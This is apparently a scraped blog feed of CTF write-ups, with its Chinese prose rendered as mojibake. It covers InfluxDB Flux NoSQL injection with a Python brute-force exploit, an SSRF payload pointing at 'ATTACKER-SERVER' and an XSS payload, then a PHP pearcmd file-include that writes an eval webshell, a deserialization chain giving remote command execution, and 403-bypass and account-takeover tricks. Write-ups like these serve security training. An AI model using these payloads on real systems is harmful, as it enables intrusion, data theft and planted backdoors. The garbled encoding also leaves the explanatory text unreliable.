è¯¥filter()å‡½æ•°ä½¿ç”¨r.nameè¡¨è¾¾å¼æ¥è¿‡æ»¤å­˜å‚¨æ¡¶åç§°ï¼Œè¯¥åç§°ræ˜¯å­˜å‚¨æ¡¶æŸ¥è¯¢çš„ç»“æœï¼Œå¹¶ä¸”nameæ˜¯å‡½æ•°ä¸­è¿”å›çš„å­—æ®µbuckets()ã€‚ å¦‚æ‚¨æ‰€è§ï¼ŒInfluxDB æŸ¥è¯¢æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼æ“ä½œ=~ï¼Œå› æ­¤æ¡ä»¶èƒŒåçš„é€»è¾‘r.name =~ /^a.*/æ˜¯ï¼Œtrueå¦‚æœå­˜å‚¨æ¡¶åç§°ä»¥å­—æ¯ å¼€å¤´ï¼Œåˆ™ä¸ºè¯¥æ¡ä»¶aã€‚ ä¹‹åï¼Œè¿‡æ»¤å™¨ä½¿ç”¨ä¸€ä¸ªandæ¡ä»¶æ¥è°ƒç”¨å‡½æ•°ï¼Œdie()å¹¶å°†å­˜å‚¨æ¡¶åç§°çš„å€¼ä½œä¸ºå‚æ•°ã€‚è¯¥die()å‡½æ•°ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œå¹¶åœ¨ç¬¬ä¸€ä¸ªå‚æ•°ä¸­ä¼ é€’è‡ªå®šä¹‰æ¶ˆæ¯ï¼Œè¿™å°†æ³„æ¼å­˜å‚¨æ¡¶åç§°ã€‚ æœ‰æ•ˆè´Ÿè½½ä¹Ÿåœ¨yield()å­˜å‚¨æ¡¶æŸ¥è¯¢ä¹‹å‰ä½¿ç”¨è¯¥å‡½æ•°ã€‚è¿™æ˜¯åœ¨ InfluxDB ä¸Šçš„å•ä¸ªè¯·æ±‚ä¸­æ‰§è¡Œâ€œå¤šä¸ªæŸ¥è¯¢â€æ‰€å¿…éœ€çš„ã€‚ æœ€åï¼Œæœ‰å¿…è¦ç”¨yield()ä¸€ä¸ªæ–°è¡Œå°† ä¸å­˜å‚¨æ¡¶æŸ¥è¯¢åˆ†å¼€ï¼Œå¹¶ä¸”åœ¨æœ‰æ•ˆè´Ÿè½½çš„æœ«å°¾ï¼Œæˆ‘åœ¨//å¦ä¸€ä¸ªæ–°è¡Œåé¢æ·»åŠ äº†è¡¨è¾¾å¼ï¼Œä»¥æ³¨é‡Šæ³¨å…¥åçš„æ‰€æœ‰å†…å®¹ã€‚ ä¹Ÿå°±æ˜¯å¦‚æœæ•°æ®åº“ä¸­å­˜åœ¨ä»¥aå¼€å¤´çš„æ•°æ®åº“åï¼Œä»–å°±ä¼šè¿”å›å…¶nameï¼Œå¦‚æœæ²¡æœ‰çš„è¯å°±ä¼šè¿”å›null å½“ä¸ºaæ—¶ï¼š å½“ä¸ºpæ—¶ï¼š å¯ä»¥çœ‹è§è¿”å›äº†privateBucketè¿™ä¸ªbucketï¼Œè¿™ä¸ªåœ°æ–¹å¯ä»¥ç”¨burpçˆ† exp.py:\nimport requests import string url = \u0026#34;https://127.0.0.1:3000?query=\u0026#34; para1= \u0026#34; \u0026#34;) |\u0026gt; yield(name: \u0026#34;1337\u0026#34;) buckets() |\u0026gt; filter(fn: (r) =\u0026gt; r.name =~ /^{}.*/ and die(msg:r.name)) //\u0026#34; s=\u0026#39;\u0026#39;+string.ascii_letters flag = sensitive_field for i in range(0,52): for j in s: try: htmlLen = requests.get(url=url+para1.format(j)).text except: print(j) if flag in htmlLen: print(htmlLen,endd=\u0026#39;\u0026#39;) break //ä¸ºäº†è®©ä½ ä»¬æ›´åŠ ç›´è§‚çš„çœ‹è§playloadï¼Œæ‰€ä»¥è¿™é‡Œæ²¡æœ‰è¿›è¡Œç¼–ç ï¼Œæ‰€ä»¥å¯èƒ½åœ¨para1å¤„ä¼šæŠ¥é”™ã€‚ æ³„éœ²bucketåŠå…¶ç›¸å…³æ•°æ® #\rå‰é¢å·²ç»æœ‰bucketçš„åç§°äº†ï¼Œæ‰€ä»¥å°±ç›´æ¥from\n\u0026#34;) |\u0026gt; yield(name: \u0026#34;1337\u0026#34;) from(bucket: \u0026#34;privateBucket\u0026#34;) |\u0026gt; range(start: 0) |\u0026gt; filter(fn: (r) =\u0026gt; die(msg:r)) // è¿™é‡Œå°±æ˜¯æŠŠfilterä¸­çš„rä¹Ÿå°±æ˜¯åŒ¹é…å‡ºæ¥çš„æ‰€æœ‰ä¸œè¥¿éƒ½è¾“å‡ºå‡ºæ¥ æœ€ç»ˆé¡µé¢è¿”å›ï¼š\n_value: B, _time: time, _stop: time, _start: time, _measurement: string, _field: string ä¹Ÿå°±æ˜¯è¿™ä¸ªbucketä¸­çš„æ‰€æœ‰çš„ç»“æ„å’Œå…¶å¯¹åº”çš„æ•°æ®ç±»å‹ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ä¾¿å¯ä»¥çˆ†ç ´å…¶å­—æ®µçš„åç§°\n\u0026#34;) |\u0026gt; yield(name: \u0026#34;1337\u0026#34;) from(bucket: \u0026#34;privateBucket\u0026#34;) |\u0026gt; range(start: 0) |\u0026gt; filter(fn: (r) =\u0026gt; r._field =~ /s.*/ and die(msg:r._field)) // ä¹Ÿå°±æ˜¯çˆ†ç ´å‡ºä»¥så¼€å¤´çš„å­—æ®µåç§°ï¼Œè¿™ä¸ªå’Œå‰é¢æ³„éœ²bucketåçš„æ˜¯ä¸€ä¸ªåŸç† å¯ä»¥çœ‹è§è¿™ä¸ªå­—æ®µåä¸º:sensitive_field æ¥ä¸‹æ¥å°±æ˜¯çˆ†å…¶æ•°æ®äº†\n\u0026#34;) |\u0026gt; yield(name: \u0026#34;1337\u0026#34;) from(bucket: \u0026#34;privateBucket\u0026#34;) |\u0026gt; range(start: 0) |\u0026gt; filter(fn: (r) =\u0026gt; r._field == \u0026#34;sensitive_field\u0026#34; and die(msg:string(v:r._value))) // æ³¨æ„ä¸‹è¿™é‡Œçš„æ•°æ®ç±»å‹ï¼ï¼ä¸ç„¶å¯èƒ½ä¼šæŠ¥é”™(æ”¾å‡ºä¸ºintç±»å‹çš„æ—¶å€™ï¼Œå› ä¸ºr.fieldé»˜è®¤ä¸ºintç±»å‹)\nHttpError: runtime error @2:54-2:124: filter: type conflict: string != int å¯ä»¥çœ‹è§è¿™é‡Œçš„å€¼ä¸º1337\nSSRFåˆ©ç”¨ #\råœ¨å®˜æ–¹æ–‡æ¡£ä¸­ï¼Œå¯ä»¥çœ‹è§influxdbåœ¨fromå‡½æ•°ä¹‹ä¸­æ˜¯å¯ä»¥æ¥å—hostå‚æ•°çš„ æ‰€ä»¥å¯ä»¥æ„é€ playloadï¼š\n\u0026#34;) |\u0026gt; yield(name: \u0026#34;1337\u0026#34;) from(bucket: \u0026#34;1337\u0026#34;, host:\u0026#34;https://ATTACKER-SERVER\u0026#34;) |\u0026gt; range(start:0) // XSSåˆ©ç”¨ #\rçœ‹è§ä¸Šé¢æ„å»ºçš„ç¨‹åº\napp.get(\u0026#39;/query\u0026#39;, async (req, res) =\u0026gt; { try { const fluxQuery = \u0026#39;from(bucket:\u0026#34;\u0026#39; + bucket + \u0026#39;\u0026#34;) |\u0026gt; range(start: 0) |\u0026gt; filter(fn: (r) =\u0026gt; r._field == \u0026#34;public_field\u0026#34; and r._value == \u0026#34;\u0026#39; + req.query.data + \u0026#39;\u0026#34;) \u0026#39; result = await query(fluxQuery) res.send(result) } catch (err) { res.send(err.toString()) } }); å½“ InfluxDB æŸ¥è¯¢ä¸­å‘ç”Ÿé”™è¯¯æ—¶ï¼Œè¯¥try{ } catch{ }è¯­å¥ä¼šå°†é”™è¯¯å‘é€å›å®¢æˆ·ç«¯ï¼Œå¹¶ä½¿ç”¨Content-Typeequals toÂ text/htmlï¼Œå…è®¸æµè§ˆå™¨åŠ è½½ HTML å’Œ JavaScriptã€‚ è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨dieå‡½æ•°åœ¨æµè§ˆå™¨ä¸Šæ‰§è¡Œxss\n\u0026#34;) die(msg:\u0026#34;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt;\u0026#34;)// å‚è€ƒæ–‡ç« ï¼š https://xz.aliyun.com/t/9908?time__1311=n4%2BxuDgD9Am4BlDRDBqDqpDU2fDcYoEEOBrGYD#toc-8 https://portswigger.net/web-security/nosql-injection#exploiting-nosql-operator-injection-to-extract-data https://rafa.hashnode.dev/influxdb-nosql-injection#heading-influxdb-nosql-queries https://docs.influxdata.com/influxdb/v2/\n","date":"1 February 2024","externalUrl":null,"permalink":"/posts/nosql-inject/","section":"Posts","summary":"","title":"nosql-inject(mangodb and influxdb)","type":"posts"},{"content":"Eazy_include #\ré¦–å…ˆè¿›æ¥å…ˆçœ‹ä¸€ä¸‹æºä»£ç \n\u0026lt;?php functionÂ waf($path){Â $pathÂ =Â str_replace(\u0026#34;.\u0026#34;,\u0026#34;\u0026#34;,$path); returnÂ preg_match(\u0026#34;/^[a-z]+/\u0026#34;,$path); } if(waf($_POST[1])){ includeÂ \u0026#34;file://\u0026#34;.$_POST[1]; } å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«å¹¶ä¸”ä½¿ç”¨äº†fileä¼ªåè®®è¿›è¡Œè¯»ä¼ å‚çš„æ–‡ä»¶ï¼Œä½†æ˜¯è¿™é‡Œè®¾ç½®äº†ä¸€ä¸ªwafå°†ï¼Œæ¢ä¸ºç©ºï¼ˆæœ¬æ¥ä»¥ä¸ºæ˜¯è¦ç»•è¿‡è¿™ä¸ªç©æ„çœ‹äº†ä¸€å †ç‰¹æ€§ï¼‰ï¼Œç„¶åè¿™é‡Œå°±å¯ä»¥ç‰µæ‰¯åˆ°ä¹‹å‰æ‰“ACTF2023æ—¶å€™çš„é‚£ä¸ªpearcmdï¼Œä¹Ÿå°±æ˜¯åŒ…å«ä¸€ä¸ªpearcmdæ–‡ä»¶ç„¶åå†™å…¥ï¼Œå¯ä»¥å†™shellæˆ–è€…ä½ å¯ä»¥ç›´æ¥æŠŠæ–‡ä»¶å†…å®¹ç›´æ¥cpåˆ°å¦å¤–ä¸€ä¸ªæ–‡ä»¶é‡Œé¢ï¼ˆå‰æè¦æœ‰æƒé™ï¼‰ã€‚ é¦–å…ˆåŒ…å«, POSTä¼ å‚: 1=localhost/usr/local/lib/php/pearcmd.php ç„¶åè¯·æ±‚çš„åœ°å€ï¼š /?+config-create+/\u0026lt;?=@eval($_POST['2']);die();?\u0026gt;+/tmp/delete ä¹Ÿå°±æ˜¯å†™è¿›äº†ä¸€ä¸ªå°é©¬è¿›å…¥å½“å‰ç›®å½•shell.phpä¸‹é¢ ç„¶åè¿ä¸€ä¸‹ æŸ¥çœ‹flag ctfshow{38472987-4228-48f8-9a35-cb46010b64c9}\nEazy_web #\rè¿›æ¥å¯ä»¥çœ‹è§æ˜¯ä¸€ä¸ªååºåˆ—åŒ–\nå¼€èƒƒå°èœï¼Œå°±è®©æˆ‘æˆä¸ºç­¾åˆ°é¢˜å­ \u0026lt;?php header(\u0026#39;Content-Type:text/html;charset=utf-8\u0026#39;); error_reporting(0); function waf1($Chu0){ foreach ($Chu0 as $name =\u0026gt; $value) { if(preg_match(\u0026#39;/[a-z]/i\u0026#39;, $value)){ exit(\u0026#34;waf1\u0026#34;); } } } function waf2($Chu0){ if(preg_match(\u0026#39;/show/i\u0026#39;, $Chu0)) exit(\u0026#34;waf2\u0026#34;); } function waf_in_waf_php($a){ $count = substr_count($a,\u0026#39;base64\u0026#39;); echo \u0026#34;hinthinthint,base64å–”\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; if($count!=1){ return True; } if (preg_match(\u0026#39;/ucs-2|phar|data|input|zip|flag|\\%/i\u0026#39;,$a)){ return True; }else{ return false; } } class ctf{ public $h1; public $h2; public function __wakeup(){ throw new Exception(\u0026#34;fastfast\u0026#34;); } public function __destruct() { $this-\u0026gt;h1-\u0026gt;nonono($this-\u0026gt;h2); } } class show{ public function __call($name,$args){ if(preg_match(\u0026#39;/ctf/i\u0026#39;,$args[0][0][2])){ echo \u0026#34;gogogo\u0026#34;; } } } class Chu0_write{ public $chu0; public $chu1; public $cmd; public function __construct(){ $this-\u0026gt;chu0 = \u0026#39;xiuxiuxiu\u0026#39;; } public function __toString(){ echo \u0026#34;__toString\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; if ($this-\u0026gt;chu0===$this-\u0026gt;chu1){ $content=\u0026#39;ctfshowshowshowwww\u0026#39;.$_GET[\u0026#39;chu0\u0026#39;]; if (!waf_in_waf_php($_GET[\u0026#39;name\u0026#39;])){ file_put_contents($_GET[\u0026#39;name\u0026#39;].\u0026#34;.txt\u0026#34;,$content); }else{ echo \u0026#34;ç»•ä¸€ä¸‹å§å­©å­\u0026#34;; } $tmp = file_get_contents(\u0026#39;ctfw.txt\u0026#39;); echo $tmp.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; if (!preg_match(\u0026#34;/f|l|a|g|x|\\*|\\?|\\[|\\]| |\\\u0026#39;|\\\u0026lt;|\\\u0026gt;|\\%/i\u0026#34;,$_GET[\u0026#39;cmd\u0026#39;])){ eval($tmp($_GET[\u0026#39;cmd\u0026#39;])); }else{ echo \u0026#34;waf!\u0026#34;; } file_put_contents(\u0026#34;ctfw.txt\u0026#34;,\u0026#34;\u0026#34;); } return \u0026#34;Go on\u0026#34;; } } if (!$_GET[\u0026#39;show_show.show\u0026#39;]){ echo \u0026#34;å¼€èƒƒå°èœï¼Œå°±è®©æˆ‘æˆä¸ºç­¾åˆ°é¢˜å­\u0026#34;; highlight_file(__FILE__); }else{ echo \u0026#34;WAF,å¯åŠ¨ï¼\u0026#34;; waf1($_REQUEST); waf2($_SERVER[\u0026#39;QUERY_STRING\u0026#39;]); if (!preg_match(\u0026#39;/^[Oa]:[\\d]/i\u0026#39;,$_GET[\u0026#39;show_show.show\u0026#39;])){ unserialize($_GET[\u0026#39;show_show.show\u0026#39;]); }else{ echo \u0026#34;è¢«wafå•¦\u0026#34;; } } å¯ä»¥çœ‹è§è¿™é‡Œæœ‰ä¸¤ä¸ªwafåœ¨å…¥å£ï¼Œ\nwaf1 #\rfunction waf1($Chu0){ foreach ($Chu0 as $name =\u0026gt; $value) { if(preg_match(\u0026#39;/[a-z]/i\u0026#39;, $value)){ exit(\u0026#34;waf1\u0026#34;); } } } å¯¹å‚æ•°è¿›è¡Œæ­£åˆ™åŒ¹é…(åŒ¹é…äº†a-zå¤§å°å†™)ï¼Œå¦‚æœåŒ¹é…åˆ°å­—æ¯åˆ™é€€å‡ºå¹¶å›æ˜¾waf1 ç„¶åä¼ å…¥çš„æ—¶å€™æ˜¯$REQUEST ï¼Œæœ‰ä¸€ä¸ªç‰¹æ€§ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥åšä¸€ä¸ªæµ‹è¯•\nå®ä¾‹ #\r\u0026lt;?php $a = $_REQUEST; var_dump($a); ?\u0026gt; å½“æˆ‘ä»¬ä½¿ç”¨GETè¿›è¡Œä¼ å‚çš„æ—¶å€™ä¾¿è¾“å‡º\narray(1) { [\u0026#34;a\u0026#34;]=\u0026gt; string(1) \u0026#34;2\u0026#34; } å½“å†ä½¿ç”¨POSTçš„æ—¶å€™\narray(2) { [\u0026#34;a\u0026#34;]=\u0026gt; string(1) \u0026#34;2\u0026#34; [\u0026#34;b\u0026#34;]=\u0026gt; string(1) \u0026#34;1\u0026#34; } é‚£ä¹ˆå¦‚æœæˆ‘è®©GETå’ŒPPOSTè¿›è¡ŒåŒæ—¶ä¼ åŒä¸€ä¸ªå‚æ•°å°±æ˜¯ï¼ˆGETçš„å€¼ä¸º2ï¼ŒPOSTçš„å€¼ä¸º10000ï¼‰ï¼š\narray(1) { [\u0026#34;a\u0026#34;]=\u0026gt; string(5) \u0026#34;10000\u0026#34; } å¯ä»¥çœ‹è§è¿™é‡Œæ˜¯ç›´æ¥è·å–äº†postçš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯ä»–çš„ç‰¹æ€§å°±æ˜¯å½“å˜é‡åç›¸åŒçš„æ—¶å€™ä¼šå…ˆè·å–POSTçš„å†…å®¹ é‚£ä¹ˆè¿™ä¸ªåœ°æ–¹å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ç»•è¿‡\nwaf2 #\rfunction waf2($Chu0){ if(preg_match(\u0026#39;/show/i\u0026#39;, $Chu0)) exit(\u0026#34;waf2\u0026#34;); } æ­£åˆ™åŒ¹é…å­—ç¬¦ä¸²show(ä¸åŒºåˆ†å¤§å°å†™)ï¼Œå¦‚æœåŒ¹é…åˆ°åˆ™é€€å‡ºè¿”å›waf2 è°ƒç”¨å¤„æ˜¯waf2($_SERVER['QUERY_STRING']);ï¼Œå®ƒç”¨äºè·å–å½“å‰è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²éƒ¨åˆ†ã€‚æŸ¥è¯¢å­—ç¬¦ä¸²æ˜¯ä½äº URL ä¸­ ? ç¬¦å·ä¹‹åçš„éƒ¨åˆ†ï¼ŒåŒ…å«äº†ä»¥é”®å€¼å¯¹å½¢å¼ä¼ é€’çš„å‚æ•°ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥urlç¼–ç ç»•è¿‡å³å¯\nwaf_in_waf_php #\rfunction waf_in_waf_php($a){ $count = substr_count($a,\u0026#39;base64\u0026#39;); echo \u0026#34;hinthinthint,base64å–”\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; if($count!=1){ return True; } if (preg_match(\u0026#39;/ucs-2|phar|data|input|zip|flag|\\%/i\u0026#39;,$a)){ return True; }else{ return false; } } åˆ©ç”¨äº†substr_countè¿›è¡Œè®¡ç®—base64å‡ºç°çš„æ¬¡æ•° è¦æ±‚base64çš„å‡ºç°æ¬¡æ•°ä¸èƒ½å¤§äºä¸€æ¬¡ï¼Œç„¶åè¿›è¡Œä¸€äº›æ­£åˆ™ é“¾å­æ¯”è¾ƒç®€å•ï¼š\nctf() __destruct -\u0026gt; show() __call -\u0026gt; Chu0_write __toString åŸºç¡€çš„popï¼š\n\u0026lt;?php class ctf{ public $h1; public $h2; } class show{ } class Chu0_write{ public $chu0; public $chu1; public $cmd; } $a=new ctf(); $a-\u0026gt;h1=new show(); $a-\u0026gt;h2=[[2=\u0026gt;new Chu0_write()]]; //åˆ©ç”¨preg_matchè§¦å‘ echo serialize($a); è¿™æ ·å°±åˆ°äº†RCEçš„åœ°æ–¹äº† æ¥ä¸‹æ¥çš„æ„é€ å¯ä»¥çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç« ï¼š https://tttang.com/archive/1395/#toc_garbage-string è¿™é‡Œæ”¾å‡ºä¸€ä¸ªè½¬åŒ–çš„è„šæœ¬ï¼š\n\u0026lt;?php $cmd =\u0026#39;system\u0026#39;; $payload = iconv(\u0026#39;utf-8\u0026#39;, \u0026#39;utf-16\u0026#39;, base64_encode($cmd)); file_put_contents(\u0026#39;payload.txt\u0026#39;, quoted_printable_encode($payload)); $result = file_get_contents(\u0026#39;payload.txt\u0026#39;); $result = preg_replace(\u0026#39;/=\\r\\n/\u0026#39;, \u0026#39;\u0026#39;, $result); echo $result; è¿™é‡Œä¸ºä»€ä¹ˆè¿™ä¹ˆå†™çœ‹å®Œä¸Šé¢çš„æ–‡ç« å°±çŸ¥é“ï¼Œæ˜¯ä¸ºäº†åˆ©ç”¨base64çš„æ­£åˆ™è¿‡ç¨‹æ­é…iconvçš„ç¼–ç è½¬åŒ–æ¥æ„é€ å‡ºè‡ªå·±æƒ³è¦çš„ä¸œè¥¿ï¼Œè¿™é‡ŒæŒ‡çš„å°±æ˜¯systemäº† ç„¶ååé¢è¾“å…¥çš„æ—¶å€™æŠŠå®ƒåè¿‡æ¥å³å¯ ä¹Ÿå°±æ˜¯ï¼š\nname=php://filter/convert.quoted-printable-decode/convert.iconv.utf-16.utf-8/convert.base64-decode/resource=ctfw ä»è€Œè®©åé¢çš„chu0æ‹¼æ¥åå½¢æˆsystem æœ€åè¯»ä¸€ä¸‹ç¯å¢ƒå˜é‡å³å¯ playload: GET :?%73%68%6f%77[%73%68%6f%77.%73%68%6f%77=%43%3a%31%31%3a%22%41%72%72%61%79%4f%62%6a%65%63%74%22%3a%31%36%34%3a%7b%78%3a%69%3a%30%3b%61%3a%31%3a%7b%73%3a%39%3a%22%67%78%6e%67%78%6e%67%78%6e%22%3b%4f%3a%33%3a%22%63%74%66%22%3a%32%3a%7b%73%3a%32%3a%22%68%31%22%3b%4f%3a%34%3a%22%73%68%6f%77%22%3a%30%3a%7b%7d%73%3a%32%3a%22%68%32%22%3b%61%3a%31%3a%7b%69%3a%30%3b%61%3a%31%3a%7b%69%3a%32%3b%4f%3a%31%30%3a%22%43%68%75%30%5f%77%72%69%74%65%22%3a%33%3a%7b%73%3a%34%3a%22%63%68%75%30%22%3b%4e%3b%73%3a%34%3a%22%63%68%75%31%22%3b%4e%3b%73%3a%33%3a%22%63%6d%64%22%3b%4e%3b%7d%7d%7d%7d%7d%3b%6d%3a%61%3a%30%3a%7b%7d%7d\u0026amp;name=php://filter/convert.quoted-printable-decode/convert.iconv.utf-16.utf-8/convert.base64-decode/resource=ctfw\u0026amp;chu0=c=003=00l=00z=00d=00G=00V=00t=00\u0026amp;cmd=env\nPOSTï¼šshow[show.show=1\u0026amp;name=1\u0026amp;chu0=1\u0026amp;cmd=1 (å…³äºä¸ºä»€ä¹ˆè¿™é‡Œçš„ä¸‹åˆ’çº¿è¦æ¢æˆ[è¿™ä¸ªæˆ‘å‰é¢çš„æ–‡ç« ä¹Ÿæœ‰å†™åˆ°è¿‡)\neazy_login #\rè¿™ä¸ªæ˜¯ä»¥å‰çš„é¢˜ç›®äº†ï¼Œgithubä¸Šé¢éƒ½æœ‰æºç  https://blog.csdn.net/m0_73512445/article/details/134879829\nå‚è€ƒæ–‡ç« ï¼š https://blog.csdn.net/m0_64016126/article/details/135368226\n","date":"25 January 2024","externalUrl":null,"permalink":"/posts/ctfshow-yuandan/","section":"Posts","summary":"","title":"CTFshowå…ƒæ—¦æ°´å‹èµ›éƒ¨åˆ†wp-web","type":"posts"},{"content":"Levi Ackerman #\ré¢˜ç›®æç¤ºæœ‰robotï¼Œæ‰€ä»¥ç›´æ¥robots.txt /l3v1_4ck3rm4n.html ç›´æ¥è®¿é—® KCTF{1m_d01n6_17_b3c4u53_1_h4v3_70}\nkitty #\rè¿›æ¥ä¹‹åæƒ³åˆ°ä¸‡èƒ½å¯†ç ç›´æ¥ç™»å½• Dashboardä¸­æŸ¥çœ‹æºä»£ç çœ‹è§ æ‰€ä»¥è¿™é‡Œç›´æ¥å†™å…¥ cat flag.txt KCTF{Fram3S_n3vE9_L1e_4_toGEtH3R}\nGain Access 1 #\rè¿›å…¥ä¹Ÿæ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œç„¶ååœ¨æ³¨é‡Šçœ‹è§äº†è´¦å·ï¼š root@knightctf.com è¿™é‡Œåˆåˆšå¥½æœ‰ä¸€ä¸ªå¿˜è®°å¯†ç ï¼Œç„¶åè¯•ç€æŠ“è¿”å›åŒ…çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿è¿”å› è¿™é‡Œçœ‹è§è¿”å›äº†ä¸€ä¸ªtokenï¼Œä½†æ˜¯è¯¥å¦‚ä½•åˆ©ç”¨å‘¢ï¼Ÿ åœ¨æ–‡ä»¶robots.txtå‘ç°æœ‰ä¸ªè·¯å¾„/r3s3t_pa5s.phpæ‰€ä»¥è®¿é—®ä¸€ä¸‹å‘ç°éœ€è¦tokenï¼Œæ‰€ä»¥è¿™é‡Œtokenç›´æ¥å¸¦è¿›å» å¯ä»¥çœ‹åˆ°è¿›å…¥äº†é‡ç½®å¯†ç æ”¹å®Œä¹‹åç™»å½•å°±æœ‰flagäº† KCTF{ACc0uNT_tAk3Over}\nReadme #\rè¿›æ¥å¯ä»¥çœ‹è§æ˜¯ä¸ªè¯»æ–‡ä»¶çš„ä¸œä¸œï¼Œ import requests URL = \u0026#39;http://66.228.53.87:8989/\u0026#39; file = \u0026#34;text.txt\u0026#34; req = requests.get(f\u0026#39;{URL}fetch?file={file}\u0026#39;) print(req.text) {\u0026ldquo;result\u0026rdquo;:\u0026ldquo;Yes! You can read files! Dont ask for hint its ezz!!\u0026rdquo;} ç„¶åè¿™é‡Œè¯»flag.txtçš„æ—¶å€™å‡ºäº†é—®é¢˜ {\u0026ldquo;result\u0026rdquo;:\u0026ldquo;403 Access Denied\u0026rdquo;} ç„¶åè¿™é‡Œçš„ç»•è¿‡æ–¹å¼å°±æ˜¯ä¼ªé€ hearder æ–‡ç« ï¼š https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses è¿™é‡Œé™„ä¸Šå®Œæ•´è„šæœ¬\nimport requests URL = \u0026#39;http://66.228.53.87:8989/\u0026#39; file = \u0026#34;flag.txt\u0026#34; # headers to bypass 403 Access Denied error headers = { \u0026#39;X-Originating-IP\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;X-Forwarded-For\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;X-Forwarded\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;Forwarded-For\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;X-Remote-IP\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;X-Remote-Addr\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;X-ProxyUser-Ip\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;X-Original-URL\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;Client-IP\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;True-Client-IP\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;Cluster-Client-IP\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;X-ProxyUser-Ip\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;Host\u0026#39;: \u0026#39;localhost\u0026#39; } req = requests.get(f\u0026#39;{URL}fetch?file={file}\u0026#39;, headers=headers) print(req.text) {\u0026ldquo;result\u0026rdquo;:\u0026ldquo;KCTF{kud05w3lld0n3!}\u0026rdquo;}\nFluxxï¼ˆåé¢çœ‹wpå¤ç°çš„ï¼‰ #\rwp adress :https://ctftime.org/writeup/38522\nè¿›æ¥å¯ä»¥çœ‹è§éœ€è¦æ·»åŠ éœ€è¦æŸ¥è¯¢çš„å‚æ•°ï¼Œæˆ‘ä»¬æŠŠå‚æ•°åŠ ä¸Š http://66.228.53.87:9001/query?data=111 ä½†æ˜¯æ²¡å•¥ä¸œè¥¿,ä½†æ˜¯çœ‹åˆ°queryï¼Œæƒ³ç€èƒ½ä¸èƒ½æ³¨å…¥ä¸€ä¸‹ playload:http://66.228.53.87:9001/query?data=1%22%20or%201=1\u0026ndash;+\nè¿”å›ï¼šHttpError: compilation failed: error @1:82-1:159: expected RPAREN, got EOF error @1:152-1:153: invalid expression @1:151-1:152: = error @1:156-1:159: got unexpected token in string expression @1:159-1:159: EOF\nåœ¨æ–‡ç« ï¼š https://community.influxdata.com/t/query-throws-rparen-got-eof-error/18940 å¯ä»¥çœ‹è§é”™è¯¯ æ‰€ä»¥å¯ä»¥çŸ¥é“æ˜¯InfluxDB nosqlæ³¨å…¥ï¼ˆå‚è€ƒæ–‡ç«  https://rafa.hashnode.dev/influxdb-nosql-injectionï¼‰ æœ€åçš„exp\nimport requests, urllib.parse base_URL = \u0026#39;http://66.228.53.87:9001/\u0026#39; letters = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; for char in list(letters): payload = f\u0026#39;\u0026#34;) |\u0026gt; yield(name: \u0026#34;1337\u0026#34;)\\nbuckets() |\u0026gt; filter(fn: (r) =\u0026gt; r.name =~ /^{char}.*/ and die(msg:r.name))\\n//\u0026#39; encoded_payload = urllib.parse.quote(payload, safe=\u0026#39;\u0026#39;) req = requests.get(f\u0026#39;{base_URL}query?data={encoded_payload}\u0026#39;) if req.text != \u0026#39;[]\u0026#39;: print(req.text) HttpError: runtime error @2:14-2:69: filter: failed to evaluate filter function: KCTF{g0UPqVWa0eUT2wF2ipzX3v5pxikvqYhxR9OL}\ngain acess2 #\rè¿›æ¥è¿˜æ˜¯ä¸€ä¸ªloginé¡µé¢ã€‚ç„¶åçœ‹è§æœ‰ä¸€ä¸ªæ–‡ä»¶notesssssss.txt æ–‡ä»¶å†…å®¹:\nI\u0026#39;ve something for you. Think..... root@knightctf.com:d05fcd90ca236d294384abd00ca98a2d åé¢çš„çœ‹èµ·æ¥åƒmd5æ‰€ä»¥å°±ç›´æ¥æ‰”è¿›å»æŸ¥-\u0026gt;letmein_kctf2024 ç›´æ¥ç™»å½•ï¼Œå‘ç°æœ‰ä¸€ä¸ªOTPè®¤è¯å¹¶ä¸”æœ‰ä¸€ä¸ªresendçš„åŠŸèƒ½ï¼Œç„¶åå’Œaccess1çš„æœ‰ç‚¹åƒï¼Œä½†æ˜¯è¿™é‡Œæ²¡è¿”å›token ä½†æ˜¯æŠ“åŒ…å‘ç°è¿™é‡Œæ˜¯ä»¥jsonæ–¹æ³•è¿›è¡Œä¼ è¾“çš„ï¼Œæ‰€ä»¥å°±æ€è€ƒèƒ½ä¸èƒ½åŒæ—¶å‘ç»™ä¸¤ä¸ªé‚®ç®± æ„é€ ï¼š\n{ \u0026#34;email\u0026#34;: 